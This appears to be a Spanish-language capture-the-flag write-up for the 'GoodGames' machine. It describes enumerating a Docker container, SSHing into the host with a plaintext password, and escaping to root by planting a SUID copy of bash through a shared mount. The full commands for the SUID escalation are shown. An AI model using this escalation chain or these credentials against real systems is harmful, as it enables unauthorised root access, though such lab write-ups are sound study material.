# Enumeracion
Tenemos la sospecha de que estamos en un contenedor, por el nombre despues de root@3a453ab39d3d
Confirmamos que estamos en un contenedor usando [[hostname -I]] somos la ip 172.19.0.2
![[Goodgames16.png]]

Usamos el comando *[[mount]] | grep augustus* y nos dice que la particion del disco duro esta montada en /dev/sda1, en el /etc/group no figura el grupo 1000, por lo tanto pensamos que es un grupo de la maquina host. y en el comando [[route -n]] nos muestra que a la direccion ip 172.19.0.1 es donde va todo nuestro trafico. Asi que asumimos que es la ip de la maquina host
![[Goodgames17.png]]
Mandamos un ping a 172.19.0.1, y nos responde
![[Goodgames18.png]]

Nos vamos a mandar el archivo [[portScanner.sh a nivel local]] desde nuestra maquina a la maquina victima

Nos da como resultado al ejecutar el escaneo de puertos, que tiene el 22 y el 80 abiertos
![[Goodgames20.png]]

Como vemos que es el puerto 22 de SSH abierto, vamos a intentar conectarnos con las credenciales de augustus que tenemos
```
ssh augustus@172.19.0.1
Contraseña: superadministrator
```

![[Goodgames21.png]]


# Explotacion con SUID


*En la maquina de augustus:*
	Usamos el comando `cp /bin/bash .` en el directorio /home/augustus
*Desde el contendor:*
	 `chown root:root bash`
	 `chmod 4755 bash`
Ahora volvemos a entrar a la maquina de augustus, con ssh, y ejecutamos la bash con privilegios, ya seriamos root, asi que despues cateamos el archivo con la flag
```shell
./bash -p
cat /root/root.txt
```
![[Goodgames22.png]]
